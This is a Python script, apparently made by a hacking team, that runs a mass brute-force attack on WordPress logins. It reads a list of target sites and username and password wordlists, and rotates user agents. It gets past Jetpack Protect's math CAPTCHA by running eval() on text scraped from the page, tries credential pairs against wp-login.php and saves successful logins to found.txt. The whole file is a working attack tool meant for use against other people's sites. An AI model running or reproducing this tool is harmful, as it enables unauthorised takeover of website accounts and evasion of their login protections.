# -*- coding: utf8 -*-
#Ya Maap codingan we berantakan :'v,jangan di recode ya KONTOL.

import requests,readline,re,os,random
from urllib.request import urlsplit
requests = requests.Session()

h = '\033[92m'
p = '\033[97m'
m = '\033[91m'
br = '\033[94m'
ua = open('ua.txt','rb').read().decode('utf8').splitlines()


__banner__ = ('''%s
      ^__^
      (%soo%s)\_______
      (__)\       )={%sHeker%s}
          ||----w |
          ||     ||
          oo     oo

%s[+]%s WordPress Massal Brute Force..
%s[+]%s Code: Jay Hutajulu a.k.a ./BarBarKing
%s[+]%s Team: D704T HackerTeam Ft MedanHackingRulez % (p,m,p,h,p,h,p,h,p,h,p))

class Main():
    def __init__(self):
        os.system('clear')
        print(__banner__)
        self.v = 0
        self.sendu()
        self.u_p()
        self.crack()

    def sendu(self):
        try:
            print('\n%s[info]%s Masukkan File list site nya.!!' % (h,p))
            f = str(input('%s[info] %slist site: ' % (h,p)))
            self.site = open(f,'rb').read().decode('utf8').splitlines()
        except Exception as _er:
            quit('%s[info]%s%s' % (m,p,_er))

    def u_p(self):
        try:
            print('%s[info]%s Masukkan WordList' % (h,p))
            us = str(input('%s[info]%s list user: ' % (br,p)))
            pw = str(input('%s[info]%s list pasw: ' % (br,p)))
            self.a = open(us,'rb').read().decode('latin').splitlines()
            self.b = open(pw,'rb').read().decode('latin').splitlines()
        except Exception as _er:
            quit('%s[info]%s%s' % (m,p,_er))

    def crack(self):
        print('%s[info]%s total site: %d' % (h,p,len(self.site)))
        print('%s[info]%s total wordlist u/p: %d' % (h,p,min([len(self.a),len(self.b)])))
        for site in self.site:
                requests.headers.update({'user-agent':random.choice(ua)})
                parse = urlsplit(site)
                netloc = parse.netloc
                scheme = parse.scheme
                print('%s[info]%s cracking: %s' % (br,p,netloc))
                for a,b in zip(self.a,self.b):
                    try:
                        data = {}
                        url = '%s://%s/wp-login.php' % (scheme,netloc)
                        cek = requests.get(url)
                        if cek.status_code != 200:
                           print('%s[info]%s path wp-login not found ' % (m,p))
                           continue
                        for c,d in re.findall(r'name="(.*?)".*?value="(.*?)"',cek.text):
                           data.update({c:d})
                        if 'jetpack_protect_num' in cek.text.lower():
                            info = re.findall(r'\n\t\t\t\t\t(.*?)=.*?\t\t\t\t',cek.text)[0].split(' ')
                            iok = (''.join(info)).replace('x','*').replace('&nbsp;','')
                            value = str(eval(iok))
                            print('%s[info]%s user agent di curigai' % (m,p))
                            print('%s[info]%s bypassin chapta :"v %s = %s%s'  % (m,p,iok,h,value))
                            data.update({'jetpack_protect_num':value})
                        else:
                            pass
                        data.update({'log':a,'pwd':b})
                        req = requests.post(url,
                            data = data
                            ).text.lower()
                        if 'dashboard' in req:
                            self.v += 1
                            print('    %s~ found%s: %s > %s , %s' %(h,p,url,a,b))
                            open('found.txt','a').write(url+'>  %s | %s \n' % (a,b))
                            break
                        else:
                            print('    %s~ failed login %s%s , %s' % (m,p,a,b))
                        continue
                    except:
                        print('%s[info] %sError gan ..' % (m,p))
                        continue
        quit('%s[%s@%s]%s selesai total %s save to found.txt' % (br,m,br,p,self.v))






#___main___:
Main()
